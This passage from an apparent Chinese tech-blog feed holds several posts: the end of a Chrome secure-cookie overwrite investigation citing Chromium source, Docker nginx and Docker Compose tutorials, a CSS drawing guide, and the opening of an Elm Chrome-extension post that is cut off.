回想了一下，發現是另外一個負責後台管理的網站叫做：https://admin.huli.com寫的，因為是用 django的關係，所以開啟 CSRF 防護之後預設的 Cookie 名稱就是csrftoken。
仔細再用 Chrome devtool 看了一下，這個 Cookie 設置了Secure，Domain是 .admin.huli.com。看起來也沒什麼異狀。
然而，在拜訪這個網站之後，我再試著去 http://test.huli.com，發現又沒辦法寫入 Cookie 了，甚至原本的 Cookie 也離奇地消失了。
太棒了！看來我離真相越來越近了！
我把這個.admin.huli.com的同名 Cookie 刪掉之後，去拜訪我自己的http://test.huli.com，發現一切都正常。Cookie 可以正常寫入。
看來答案很明顯了，那就是：

只要.admin.huli.com的那個同名 Cookie 存在，http://test.huli.com就沒辦法對.huli.com寫入同名的 Cookie。

解法其實到這邊就很明顯了，第一個是改一個 Cookie 名稱，第二個是改一個 Domain。
有關於第二個解法，還記得我們在 http://test.huli.com 是寫入 .huli.com 這個 Domain 的 Cookie 嗎？只要改成寫入 .test.huli.com 這個 Domain，一樣可以正常運作。
所以若是講得更詳細一點，這個寫不進去 Cookie 的問題就發生在：

當有一個 Domain 為.admin.huli.com並設置成Secure的 Cookie 已經存在的時候，http://test.huli.com就沒辦法對.huli.com寫入同名的 Cookie。

在大概確認問題以後，我就開始調整各個變因，看能不能查出到底是哪一個環節出了問題，最後我發現兩個重點：

其實只有 Chrome 不能寫，Safari, Firefox 都可以
Secure 這個 flag 沒有設置的話，就可以寫

深入追查既然有了只有 Chrome 會發生這種情形的這個有力線索，就可以循著這條線繼續追查下去，那怎麼追查呢？
沒錯，就是最簡單直接的方法：去找 Chromium 的原始碼！
以前看過很多文章都是查問題查一查最後查到 Source code 去，終於輪到我也有這一天了。可是 Chromium 的原始碼這麼一大包，該如何找起呢？
於是我決定先 Google：chromium cookie，在第一筆搜尋結果發現了很有幫助的資料：CookieMonster。這篇文章有詳細說明了 Chromium 的 Cookie 機制是怎麼運作的，並且說明核心就是一個叫做 CookieMonster 的東西。
再來就可以直接去看 Source code 了，可以在 /net/cookies 找到 cookie_monster.cc。
還記得剛剛發現的問題重點之一，推測是跟Secure這個 flag 有關，所以直接用 Secure 當關鍵字下去搜尋，可以在中間的部分發現一個 DeleteAnyEquivalentCookie 的 function，以下節錄部分原始碼，1625 行到 1647 行：
// If the cookie is being set from an insecure scheme, then if a cookie// already exists with the same name and it is Secure, then the cookie// should *not* be updated if they domain-match and ignoring the path// attribute.//// See: https://tools.ietf.org/html/draft-ietf-httpbis-cookie-aloneif (cc-&gt;IsSecure() &amp;&amp; !source_url.SchemeIsCryptographic() &amp;&amp;    ecc.IsEquivalentForSecureCookieMatching(*cc)) &#123;  skipped_secure_cookie = true;  histogram_cookie_delete_equivalent_-&gt;Add(      COOKIE_DELETE_EQUIVALENT_SKIPPING_SECURE);  // If the cookie is equivalent to the new cookie and wouldn&#x27;t have been  // skipped for being HTTP-only, record that it is a skipped secure cookie  // that would have been deleted otherwise.  if (ecc.IsEquivalent(*cc)) &#123;    found_equivalent_cookie = true;    if (!skip_httponly || !cc-&gt;IsHttpOnly()) &#123;      histogram_cookie_delete_equivalent_-&gt;Add(          COOKIE_DELETE_EQUIVALENT_WOULD_HAVE_DELETED);    &#125;  &#125;&#125; 

這邊很貼心的幫你加上了註釋，說是：

如果有個 cookie 是來自 insecure scheme，並且已經存在一個同名又設置為 Secure 又 domain-match 的 cookie 的話，這個 cookie 就不該被設置

雖然不太理解 domain-match 指的到底是怎樣才算 match，但看來我們碰到的寫不進去 Cookie 的問題就是在這一段發生的。而且還有貼心附上參考資料：https://tools.ietf.org/html/draft-ietf-httpbis-cookie-alone標題為：「Deprecate modification of ‘secure’ cookies from non-secure origins」。
內容不長，很快就可以看完，以下節錄其中一小段：
Section 8.5 and Section 8.6 of [RFC6265] spell out some of thedrawbacks of cookies&#x27; implementation: due to historical accident,non-secure origins can set cookies which will be delivered to secureorigins in a manner indistinguishable from cookies set by that originitself.  This enables a number of attacks, which have been recentlyspelled out in some detail in [COOKIE-INTEGRITY].
附註中的參考資料是這個：Cookies Lack Integrity: Real-World Implications，裡面有附一段二十幾分鐘的影片，可以看一看，看完之後就會知道為什麼不能寫入了。
如果你還沒看，這邊可以幫大家做一個總結。要知道為什麼剛開始那個 case 不能寫入 Cookie，可以先想想看如果可以寫入，會發生什麼事情。
假如 http://test.huli.com 成功寫入 .huli.com 的 csrftoken 這個 cookie 的話，對 http://test.huli.com 似乎沒什麼影響，就多帶一個 Cookie 上去，看起來合情合理。
可是呢，卻對 https://admin.huli.com 有些影響。
原本 .admin.huli.com 並且設置為 Secure 的 Cookie 還是會在，但現在多了個 .huli.com 又是同名的 Cookie。當 https://admin.huli.com 送 request 的時候，就會把這兩個 Cookie 一併帶上去。所以 Server 收到的時候可能會是這樣：
csrftoken=cookie_from_test_huli_com; csrftoken=cookie_from_admin_huli_com

但碰到同名 Cookie 的時候，很多人都會只取第一個處理，所以 Server side 收到的 csrftoken 就會是 cookie_from_test_huli_com。
意思就是說，儘管你在 https://admin.huli.com 用 Secure 的方式寫了一個 Cookie，卻被其他不安全的來源（http://test.huli.com）給覆蓋過去了！
那蓋掉 Cookie 可以做什麼呢？舉幾個上面參考資料給的例子（但我不確定有沒有理解錯誤，有錯的話請指正），第一個是 Gmail 的視窗不是分成兩部分嗎，一部分是信箱，另外一部分是 Hangouts。攻擊者可以利用上面講的手法把原來使用者的 cookie 蓋掉，換成自己的 session cookie，可是因為 Hangouts 跟 Gmail 本身的 domain 不一樣，所以 Gmail 還是使用者的帳號，Hangouts 卻已經變成攻擊者的帳號了。
被攻擊的人就很有可能在不知情的狀況下利用攻擊者的帳號來發送訊息，攻擊者就可以看到那些訊息了。
第二個例子是某間銀行網站，假如在使用者要新增信用卡的時候把 session cookie 換成攻擊者的，那這張信用卡就新增到攻擊者的帳戶去了！
大概就是這樣，總之都是透過把原本的 cookie 遮蔽住，讓 server side 使用新的 cookie 的攻擊方法。
總結我一開始碰到這個問題的時候真的滿苦惱的，因為怎麼想都想不到為什麼一個語法完全沒錯的指令沒辦法寫入 Cookie，而且https://admin.huli.com這個網站我平常也很少用到，根本不會想到是它的問題。
但這次把問題解掉之後重新回來看，其實過程中就有一些蛛絲馬跡可循，例如說可以透過「清掉 Cookie 就沒事」這點得知應該是跟其他 Cookie 有干擾，也可以從別的瀏覽器可以寫入這點得知應該是 Chrome 的一些機制。
過程中的每個線索都會帶你找到新的路，只要堅持走下去，一定能成功闖出迷宮。
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>cookie</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 Docker 建立 nginx 伺服器入門教學</title>
    <url>/2018/03/17/docker-build-nginx-tutorial/</url>
    <content><![CDATA[
前言相信一般開發者每次開發應用程式時最討厭的就是設定環境。往往裝好環境時開發應用的熱情往往被消磨一半，不過如今有了 Docker 不但可以提高開發效率也可以更容易管理整個服務架構，發展 micro service！
Docker 基本概念Docker 和傳統在硬體做虛擬化的方式不同，其主要在作業系統層做虛擬化且在主流的作業系統和雲端平台上都可以使用（例如：Linux、MacOS 和 Windows），不同作業系統 Docker 相關安裝方式可以參考官方網站。

關於 Docker 基本有三大主軸概念：

Docker 映像檔（Image）：類似於虛擬機的映像檔，是一個可以創建容器的模版（template）
Docker 容器（Container）：類似於一個輕量級 sandbox。Docker 是透過容器來運行並隔離應用
Docker 倉庫（Repository）：類似於程式碼儲存地，可以想成是 Docker 版的 git repo。而 Docker Hub 類似於 Docker 版的 Gihub，有許多 repo 在上面分享

使用 Docker 建立 Nginx 伺服器

使用官方 nginx image 運行 docker container
 將 nginx image 跑起來成為一個 webserver container，並把 docker container 80 port 對應到本機端的 0.0.0.0:7777
 $ docker run -d -p 7777:80 --name webserver nginx

 若本地端沒有 image 則會從遠端下載： Unable to find image ‘nginx:latest’ locally latest: Pulling from library&#x2F;nginx

檢查 Docker container 是否運行（有可能需要 sudo 權限）
 $ docker ps

 此時在瀏覽器 http://localhost:7777 應該可以看到 nginx 伺服器的首頁

替換 nginx 首頁
 在目前資料夾建立一個 index.html 檔案：
 &lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;    &lt;head&gt;        &lt;title&gt;&lt;/title&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;h1&gt;Hi Nginx Docker&lt;/h1&gt;    &lt;/body&gt;&lt;/html&gt;

 記得把之前的 docker container 先 docker stop webserver 暫停然後輸入：
 （若遇到已經創建同樣名稱 container 時可以先輸入 docker stop CONTAINER_NAMES） 後 docker rm CONTAINER_NAMES）
 $ docker run --name nginx-container -p 7777:80 -v index.html:/usr/share/nginx/html:ro -d nginx

 此時在瀏覽器 http://localhost:7777 即可以看到 nginx 伺服器的首頁被換成我們 index.html 內容

使用 Dockerfile 建立新的映像檔：
 FROM nginxCOPY ./index.html /usr/share/nginx/html

 開始根據目錄下 Dockerfile 建立映像檔
 $ docker build . -t my-nginx-image

 成功後可以執行 run 動作，但記得把之前的 docker container 先 stop 暫停
 $ docker stop webserver

 執行 docker run 透過我們剛建立的 my-nginx-imag 來建立 container
 $ docker run --name nginx-container -d my-nginx-image

 此時在瀏覽器 http://localhost:7777 應該又可以看到 nginx 伺服器的首頁被換成我們 index.html 內容


總結以上就是簡單的使用 Docker 建立 nginx 伺服器入門教學，事實上 docker 功能還有多有趣的應用，網路上也有許多已經打包好的 image 檔案等著發掘。對了，自從有了 docker 之後不但可以早點下班，搞壞環境也不用怕！
參考文件
Docker 基本觀念與使用教學：自行建立 Docker 影像檔
twtrubiks&#x2F;docker-tutorial
教你一次學會安裝 Docker 開始玩轉 Container 容器世界
Docker —— 從入門到實踐

（image via logz）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>nginx</tag>
        <tag>docker</tag>
        <tag>server</tag>
        <tag>container</tag>
        <tag>apache</tag>
        <tag>iamge</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker Compose 建置 Web service 起步走入門教學</title>
    <url>/2018/09/07/docker-compose-tutorial-intro/</url>
    <content><![CDATA[
前言身為一個開發者最惱人的莫過於環境建置和部屬應用程式。隨著 Docker 容器和虛擬化技術進步以及 DevOps、Infrastructure as Code 文化的推廣，讓我們可以更容易在不同環境開發部屬並調度（Orchestration）我們的專案應用程式。在 Docker 中，除了 Docker 指令和 Docker Engine 背後的技術外，最重要的莫過於 Docker Machine、Docker Compose 和 Docker Swarm 三劍客了。接下來我們將透過 Docker Compose 來啟動並執行 Python Flask + Redis 網頁人數統計的專案，讓讀者能夠理解 Docker Compose 的優勢和使用方式。那就讓我們開始吧！

Docker Compose 簡介一開始我們先了解 Docker Compose 是一個工具可以讓你可以透過一個指令就可以控制所有專案（project）中所需要的 services。Docker Compose 是用 YAML 檔案格式來描述和定義 project 中 services 運作關係，白話來說就是用來管理 Container 的文件檔。
什麼意思呢？
試想一下，我們在開發一個典型的 Web project 時通常不是只有一個 service，有可能需要 app server、database、cache，甚至是 reverse proxy 等 service 才能構成一個可以上線運行的專案，這些 service 往往會需要多個 container 來運行。此時若是使用 Docker CLI 需要手動輸入多少行才能正式啟動一個 project？這時候就是 Docker Compose 發揮功能的時候啦！
我們先來看看，一個基本的 docker-compose.yml 檔案長這樣（YAML 檔案格式，使用空格來縮排，附檔名為 .yml）：
version: &#x27;3&#x27; # 目前使用的版本，可以參考官網：services: # services 關鍵字後面列出 web, redis 兩項專案中的服務  web:    build: . # Build 在同一資料夾的 Dockerfile（描述 Image 要組成的 yaml 檔案）成 container    ports:      - &quot;5000:5000&quot; # 外部露出開放的 port 對應到 docker container 的 port    volumes:      - .:/code # 要從本地資料夾 mount 掛載進去的資料    links:      - redis # 連結到 redis，讓兩個 container 可以互通網路  redis:    image: redis # 從 redis image build 出 container

Dockerfile 和 Docker Compose 的差異是？在了解到 Docker Compose 主要是用來描述 Service 之間的相依性和調度方式後，我們來看看同樣初學者會比較容易搞混的觀念：Dockerfile。事實上 Dockerfile 是用來描述映像檔（image）的文件。
所謂的 Image，就是生產 Container 的模版，你可以從 Docker Hub 官方下載或是根據官方的 Image 自己加工後打包成 Image 或是完全自己使用 Dockerfile 描述 Image 內容來製作 Image。而 Container 則是透過 Image 產生隔離的執行環境，稱之為 Container，也就是我們一般用來提供 microservice 的最小單位。
# 這是一個創建 ubuntu 並安裝 nginx 的 imageFROM ubuntu:16.04 # 從 Docker hub 下載基礎的 image，可能是作業系統環境或是程式語言環境，這邊是 ubuntu 16.04MAINTAINER demo@gmail.com # 維護者RUN apt-get update # 執行 CMD 指令跑的指令，更新 apt 套件包資訊RUN apt-get install –y nginx # 執行 CMD 指令跑的指令，安裝 nginxCMD [&quot;echo&quot;, &quot;Nginx Image created&quot;] 

以上為簡單的 Dockerfile。我們可以看到，只需一個文字檔，就清楚描述一個 Docker image。利於使用版本控制，也可以減少 shell script 的工作量。
透過 Docker 建立 Python Pageview App在建立了 Dockerfile 和 Docker Compose 的基礎觀念後，我們來透過一個簡單 Python Flask + Redis 網頁人數統計的專案讓讀者可以更深刻理解 Docker Compose 的威力。
環境準備：Lniux&#x2F;MacOS 為主可以輸入指令的終端機（若為 windows 可以使用 cmder）到官網安裝 Docker基本 Docker 和 Web 知識

創建專案資料夾
$ mkdir docker-compose-python-flask-redis-counter$ cd docker-compose-python-flask-redis-counter

在資料夾下建立 app.py 當做 web app 進入點，裡面有 flask 和 redis 操作，當使用者瀏覽首頁時，redis 會記錄次數，若有 exception 則有 retry 機制
 import timeimport redisfrom flask import Flaskapp = Flask(__name__)cache = redis.Redis(host=&#x27;redis&#x27;, port=6379)def get_hit_count():    retries = 5    while True:        try:            return cache.incr(&#x27;hits&#x27;)        except redis.exceptions.ConnectionError as exc:            if retries == 0:                raise exc            retries -= 1            time.sleep(0.5)@app.route(&#x27;/&#x27;)def get_index():    count = get_hit_count()    return &#x27;Yo! 你是第 &#123;&#125; 次瀏覽\n&#x27;.format(count)if __name__ == &quot;__main__&quot;:    app.run(host=&quot;0.0.0.0&quot;, debug=True)

建立套件 requirements.txt 安裝資訊讓 Dockerfile 可以下指令安裝套件
 flaskredis

建立 Web App 的 Dockerfile
 FROM python:3.4-alpine # 從 python3.4 基礎上加工ADD . /code # 將本地端程式碼複製到 container 裡面 ./code 資料夾WORKDIR /code # container 裡面的工作目錄RUN pip install -r requirements.txtCMD [&quot;python&quot;, &quot;app.py&quot;]

用 Docker Compose file 描述 services 運作狀況，我們的專案共有 web 和 redis 兩個 service
 version: &#x27;3&#x27;services:web:    build: .    ports:    - &quot;5000:5000&quot;    volumes:    - .:/code # 把當前資料夾 mount 掛載進去 container，這樣你可以直接在本地端專案資料夾改動檔案，container 裡面的檔案也會更動也不用重新 build image！redis:    image: &quot;redis:alpine&quot; # 從 Docker Hub registry 來的 image

用 Docker Compose 執行你的 Web app（-d detached 是在背景執行，可以使用 $ docker ps -a 觀看目前所有 docker container 狀況，使用 $ docker-compose ps 觀看 docker-compose process 狀況）
 $ docker-compose up -d

 若要終止並移除 container 則可以使用 $ docker-compose down

到 http://127.0.0.1:5000/ 觀看成果



總結以上透過 Docker Compose 來啟動並執行 Python Flask + Redis 網頁人數統計的專案，讓讀者能夠理解 Docker Compose 的優勢和使用方式（Docker Compose 是一個工具可以讓你可以透過一個指令就可以控制所有專案（project）中所需要的 services）。同時也複習了 Dockerfile、Docker Image、Container 相關知識。Ya，自從有了 Docker Compose 在本地開發測試專案更加方便，考試都考一百分了！
參考文件
Get started with Docker Compose
深入淺出 Dockerfile 與 Docker Compose
部署Docker Compose　實例示範定義檔撰寫
Docker Compose 初步閱讀與學習記錄

（image via cuelogic、Zabbix）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:)
]]></content>
      <tags>
        <tag>docker</tag>
        <tag>容器</tag>
        <tag>docker machine</tag>
        <tag>docker compose</tag>
        <tag>docker swarm</tag>
        <tag>vm</tag>
      </tags>
  </entry>
  <entry>
    <title>用 CSS 畫畫的小技巧</title>
    <url>/2017/11/17/drawing-css-image/</url>
    <content><![CDATA[前言我想每個人小時候應該都蠻喜歡畫畫的吧？在沒有遊戲機、沒有 iPhone 的年代，拿著畫筆跟一張紙就可以開心度過幾個小時，但不知道從什麼時候開始就忘掉了這份快樂。
今天想邀請大家把『快樂』找回來！
身為工程師，我們拿起畫筆可能畫不出一個漂亮的圓，但透過熟悉的 CSS 我們可以做到。
『等等，平常上班調 CSS 就已經夠耗神了，你還要拿來畫圖？這除了炫技以外，對專業能力有什麼實質幫助嗎？你看連知乎上也有人這樣想。』
那你滑 ig 對專業能力有什麼實質幫助嗎？
威～話不是這樣講，休閒活動是很重要的，以工作上來說，需要圖片時，當然還是出 SVG 圖檔比較有效率，效果也較好，但是透過 CSS 畫圖有幾個我個人認為蠻重要的好處：

讓你對 CSS 的 Layout 佈局、style 屬性的操作更加熟悉

透過這種娛樂性質的練習，培養對 CSS 掌控性的自信，找回對工作與技術的愛

工作總是會遇到需要支援舊版瀏覽器的狀況吧？很多新玩意兒你無法在工作中使用，那就透過這種機會好好把玩一下吧～


訓練拆解頁面模組的能力

在 codepen 上臨摹他人著作時，可以想想如果是你，會怎麼組織你的元素，然後再跟作者比對看看誰的作法更棒！


鍛鍊在有限資源下發展出無限創造力，就像李麥克一般。

這點是我覺得最有趣的，在 CSS 有限的能力下，你要想辦法找出方法來實作想要的效果，不知不覺中會鍛鍊你的思考與解決問題的能力！
很多時候你會發現，看似複雜的東西，透過 CSS 的一些簡單屬性，其實非常容易。


你可以透過 CSS 動畫輕易的繪製出動態圖片，這就不是你單純畫筆能做到的了！


今天就來介紹幾個簡單的小技巧，讓你能用 CSS 畫出如下的圖片！（什麼？你不知道 Rick and Morty？先去看再回來。）

看得出來是用 CSS 畫的嗎？
Rick - pure css原始碼在此，由於沒有處理 RWD，所以就不直接放過來啦～
接下來我會先從繪圖的工具開始介紹起，接著提供一些顏色搭配與繪圖靈感的資源，最後進入一連串 CSS 繪圖的技巧介紹。
繪圖小工具Pre-processorCSS 畫圖的兩個主要工具就是 HTML 與 CSS，你當然可以直接用一般的 HTML 與 CSS 來製作你的 Pure CSS image，但我比較推薦使用 Pug 與 SCSS 兩個 pre-processor 來幫助你。
Pug 其實就是以前 Nodejs 的 Template engine Jade 改名後的版本，他能讓你利用下面的方式來架構你的 HTML：
div.skydiv.rick    div.body    div.head

等同於：
&lt;div class=&quot;sky&quot;&gt;    &lt;div class=&quot;rick&quot;&gt;        &lt;div class=&quot;body&quot;&gt;&lt;/div&gt;        &lt;div class=&quot;head&quot;&gt;&lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;

看起來簡潔又省了許多重複的打字作業。
SCSS 相信就更不陌生了，透過 SCSS，你可以用更直覺的方式來撰寫 CSS 階層，並利用變數來讓你的 css 更有彈性：
$rick-body-color = #DDD8D0;.rick &#123;    .body &#123;        background-color: $rick-body-color;    &#125;    &amp;:before &#123;        content: &quot;Rick&#x27;s body&quot;;        position: absolute;        width: 100px;        height: 100px;    &#125;&#125;

等同於：
.rick .body &#123;    background-color: #DDD8D0;&#125;.rick .body::before &#123;    content: &quot;Rick&#x27;s body&quot;;    position: absolute;    width: 100px;    height: 100px;&#125;

繪圖平台上述兩套 pre-process 在 codepen、jsbin 等平台上都可以很方便的使用，我推薦大家到 Codepen 上面去練習並發布自己的作品，同時也看看上面的神人們（真的是超多神人…）是怎麼玩弄 CSS 的。
Codepen 上有許多 css 的活動，像是 #Codevember、#DailyCSS 等等，鼓勵大家每天到 Codepen 上展現自己的創意與能力，我其實也蠻想參加的，但是 Daily 真的太困難哈哈，如果也有人跟我一樣的感受，不如我們自己來弄個 #WeeklyCSS 吧！
顏色選擇工具畢竟我們不是設計師，在顏色的敏銳度上可能欠缺鍛鍊，但沒關係啊，我們是為了休閒、為了把愛找回來。
可以透過 coolors 這個網站幫你產生一些對應的顏色組合，或是利用 Colorzilla 來從別人頁面取得你看上眼的顏色。
靈感來源唯一推薦 dribbble，許多人都會從上面找尋靈感，然後轉成 pure css 的版本，甚至是加上動畫效果，讓圖片活起來。
也可以去 behance 以及剛剛提到的 codepen，當然還有其他許多平台，但是我覺得光 Dribbble 上的圖就夠你玩了XD
CSS 繪圖技巧好的，終於要進入 CSS 繪圖的實戰技巧。只要掌握住這邊介紹的小撇步，你就能繪製出如範例一般的 Pure CSS image！
善用各種形狀疊加組合大家都知道 HTML 與 CSS 的基本形狀就是一個四四方方的 box，但是我們可以透過幾種方式「製造」出各種形狀：

最常見的三角形：  如果你們曾經有需要製作 三角形的 div 的話，或許有看過 css arrow please 這個網站，  若仔細研究一下，你會發現它的原理很簡單，就是利用寬高皆為 0 的 div 上的 border 寬度來做變化，舉例來說：  我們若設置一個 div 的寬高，以及四邊的邊寬，會呈現如下情況：
  
  .rect &#123;    height:20px;    width:20px;    border-color:red blue yellow green;    border-style:solid;    border-width:20px;&#125;
  接著我們把 寬、高 都設為零，不就看到三角形了嗎：
  
  .rect &#123;    height: 0px;    width: 0px;    border-color:red blue yellow green;    border-style: solid;    border-width: 20px;&#125;
  所以只要留下一種顏色，就是我們要的結果了：
  
  .rect &#123;    height: 0px;    width: 0px;    border-color:red transparent transparent transparent;    border-style: solid;    border-width: 20px;&#125;
  [詳細介紹可以看這邊，還有教你如何支援到 IE6！](http://caibaojian.com/css-border-triangle.html)

神奇的 border 之不是只有一種角度：  除了用來製作三角形以外，很多人常常忽略 border 其實可以根據各種方位來調整，像是 border-top-left-radius 或是 border-left-width，舉例來說，Rick 身上襯衫的衣領，我們可以這樣做：
  .shirt &#123;    border-bottom-right-radius: 100%;    border-right: 3px solid #666;    top: 25px;    left: 0;    position: absolute;    background-color: white;    width: 10px;    height: 40px;&#125;

  

  透過 border-bottom-right-radius 就可以有一個小括弧的效果。

堆疊組合：  以前面 Rick 的範例來看，他的頭髮部分就可以有很多種實作方式，你可能會想使用剛剛介紹的三角形，加上 transform: rotate()，組合出其雜亂有型的頭髮，但我太懶了，直接用 div 來堆疊組合：
  
  堆疊組合有時候需要搭配 overflow:hidden，像是 Rick 的嘴巴，就是透過外層設定 overflow，並搭配適當角度的 border-radius，才能製作出這種弧度的效果：
  
  
css clip-path:  若是真的想要有多邊形，可以使用 clip-path。  clip-path 是原本就存在於 SVG 中的一個屬性，讓我們能利用遮罩的方式來裁切出多邊形，在用 css 畫圖的時候，基本上就不要管瀏覽器支援度了吧，大膽用下去就對了！這邊提供幾個資源讓有興趣的人再去研究一下：  Clip path generator  Clip path 詳細介紹  Can I use clip-path


偽元素 Before &amp; after 是最佳幫手偽元素在 CSS 繪圖當中佔據的角色真是太重要了，透過 before 與 after 的操作，你可以更有組織的來管理元素，以 Rick 的眼睛來說，我們可以先畫出一個圓形，在透過 before 和 after 兩個偽元素來產生 “眼皮” 與 “黑眼球”：

.right-eye, .left-eye &#123;    position: relative;    float: left;    box-sizing: border-box;    width: 80px;    height: 80px;    border-radius: 50%;    border: 2px solid $rick--border;    background-color: #fff;    &amp;:before &#123;        // 眼皮    &#125;    &amp;:after &#123;        // 眼球    &#125;&#125;

透過 偽元素，我們可以把相關的元素綁定在一起，也少了一些 div 的宣告，對於 Layout 上的調整來說也更加方便，因此一定要善加利用這個特性！
box-shadow 與 background-image 給予的另種可能性有了上述的知識，基本上你要湊出一個 Rick 或是 Morty 都是沒問題的，不過還有個小技巧想介紹給大家，就是 box-shadow 與 background-image。
首先是 box-shadow，是我覺得最酷的一個東西，利用 box-shadow，我們可以只用一個 div 就做出各種圖案，像是 Calendar Icon： 或是棋盤：JS Bin on jsbin.com
運用 box-shadow 與 background-image 的原理都是利用到可以設定多個值的特性，以上面的棋盤為例子，4 x 4 的棋盤有 16 個方塊，扣除掉本身 div 佔據的一個，你需要設定 15 個 box-shadow 的值： 10px 0 0 #f00, 代表在 X offset 10px, Y offset 0px 的位置有一個 #f00 的方塊（blur 與 spread 為 0），依此類推去組出棋盤。
懂得原理以後，慢慢就可以製作出更複雜的效果，像是 Rick 範例中的名字，每一個字母就是一個 div 去透過 box-shadow 組成的：

background-image 在我這次的範例中沒有使用到，但基本原理差不多，可以看這邊的範例：
See the Pen Pure CSS  Hotdog   🌭 by yumeeeei (@yumeeeei) on CodePen.


總結用 CSS 畫圖實際上是個蠻辛苦的事情，但就如我先前所說，可以訓練到很多思考能力以及創意發想，更重要的是，當你用一些很特別的技巧來達成你想要的效果時，成就感是非常大的啊～～
我也還在努力中，有興趣的話就跟我一起來 #WeeklyCSS 吧！
資料來源
愛，可曾記得 - Paul Li
How I started drawing CSS Images
Pure-CSS-Hotdog
Clip path generator
Clip path 詳細介紹
Can I use clip-path
Class: how-to-make-pure-css-images

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>css</tag>
        <tag>drawing</tag>
      </tags>
  </entry>
  <entry>
    <title>利用 Elm 製作 Chrome Extension</title>
    <url>/2019/04/22/elm-chrome-extension/</url>
    <content><![CDATA[前言直接先來個成果圖：

今年二月移轉陣地到日本來工作，搬到一個人生地不熟的地方，初始開銷少不了，除了交通、伙食、房租外，還需要添購許多傢俱。而當然，所有東西都是以日幣標價，就算 Amazon JP 已經非常方便的有簡體版的語系可以切換，價格上還是得以日幣顯示。
對我來說，還沒有辦法習慣以日幣來衡量物品的價值，像是我能很快知道一千日幣大約三百台幣，但看到一個東西標價兩萬九日幣，我沒辦法很快速的理解這東西是多貴或多便宜，腦袋還是會想把它轉成台幣來衡量。
所以就造成我在 Amazon JP 或是 Nitori 的網站挑選商品時，常常要複製價格，然後開啟另一個 tab 來搜尋日幣轉換台幣的網站，再填入轉換。
一次兩次還好，第三次就無法忍受了，引用 “Refactoring — Improving the Design of Existing Code” 這本書中的一句話：*”Three strikes, then you refactor.”*
稍微找了一下 Chrome web store，並沒有看到適合的 extension，所以決定自己打造一個。
而剛好在前幾週參加了同事主辦的 Meetup，其中有個 Topic 是介紹 Elm 這個語言，以前雖然也聽過介紹，但這次聽到實際用在 Production 的案例後，提高我不少興趣，加上適逢公司的 hackday，索性就利用這機會來練習一下，用 Elm 來製作我想要的 Chrome Extension！
今天就用這篇文章記錄一下使用 Elm 製作 Chrome Extension 的方法與心得，不過畢竟是 hackday 作品，功能尚需完善就是。
什麼是 Elm？
不知道有沒有人跟我一樣，之所以知道 Elm，是因為 Redux 的作者說他受其啟發？
跟 Redux 作者一樣，Elm 的作者 - Evan Czaplicki 也是個年輕奇才，Elm 是他在哈佛的論文，推薦大家看一下他 2012 年的演講影片，可以了解他為何創造這門語言，聽聽作者本人親口介紹。
Elm 是一個強型態的函數式語言，透過編譯，將最終程式碼轉化為 JavaScript，因此執行在任何 Web 平台。主要有以下特點：

No Runtime Exceptions

在編譯期間，Elm 會利用 Type inference 偵測各種狀態，有任何型別上的錯誤都會被抓出來，更棒的是，Elm 提供的 hint 很人性化，例如：


Great Performance

如同 React 一般，Elm 也有自己的 Virtual DOM 實作，根據官網所說，由於 Elm 的所有值都是 immutable，有助於他們能編譯出最佳化的 JavaScript，讓 runtime 變快。 source: elm-lang.org


Enforced Semantic Versioning

Elm 強大的 type system 讓他能自動偵測是否有 API 的更動，並根據你 release 時與上一版本的差異，進行 Semantic Versioning，讓你不會不小心因為錯誤的 PATCH release 造成別人的困擾！


Small Assets

Elm 宣稱其 Optimize 的編譯，能產生比 React 16.4 更小的 Assets。source: elm-lang.org


JavaScript Interop

如同 React 一樣，你也可以只在一個小小的 div 上掛載 Elm application，藉此來測試 project 中的某一個小部分，採用上可以循序漸進，不會有太大風險，並且由於編譯成 JavaScript，Elm 能方便的與一般的 JavaScript 溝通。（基本上我也是看到這點才有信心 Elm 能拿來製作 Chrome extension 的）



先偷看一下 Elm 的程式碼到底長怎樣view : Model -&gt; Html Msgview model =    Html.div        [ Html.Attributes.class &quot;Content&quot;        ]        [          Html.text (&quot;Hello Elm!&quot;)        ]

這是一個簡單的 Elm view，第一行是描述這個 View 所接收的參數型別，以及回傳的參數型別，第二行後才是實際的程式碼。
看起來非常畸形。
一開始很難理解，沒關係，我寫完這個 extension 以後也還是覺得很難理解。
畢竟會需要花不少時間習慣連 HTML 都是函數的概念，裡面的 HTML.div 就是一個函數，他接受兩個陣列，一個用來定義 div 的 attribute，一個用來描述其 child。在後面的實作範例內，我們會看到更多類似的語法。
Elm 基本安裝使用Elm 的安裝很簡單，官網提供各平台的 installer，安裝完後就能在你的 Terminal 中使用以下幾個指令：
elm repl - 顧名思義， Elm 的 repl：

elm reactor - 類似 react 的 create-react-app，會快速幫你建立一個基礎的 Elm Architecture。
elm make - elm 的 compile 指令，將你的 Elm code 編譯成 HTML 或是 JavaScript：
elm make Main.elm --output=main.js

elm install - 類似 npm install，幫你下載所需的套件。所有的 Elm packages 都在 package.elm-lang.org 中。而你專案中 packages 的 dependencies 會在自動紀錄在 elm.json 中。
Elm Architecture現在的前端開發者對於 Elm 的架構應該都會覺得不陌生，因為就很清楚的分為 Model、View、Update：

Model - 你的 application 的 state
Update - 更新 state 邏輯的部分
View - 綁定 State 更新 HTML

一個基本的 Elm 程式大概就是包含這三大區塊：
import Html exposing (..)-- MODELtype alias Model = &#123; ... &#125;-- UPDATEtype Msg = Reset | ...update : Msg -&gt; Model -&gt; Modelupdate msg model =  case msg of    Reset -&gt; ...    ...-- VIEWview : Model -&gt; Html Msgview model =  ...

在接下來的範例內，也是遵循這樣的方式撰寫。
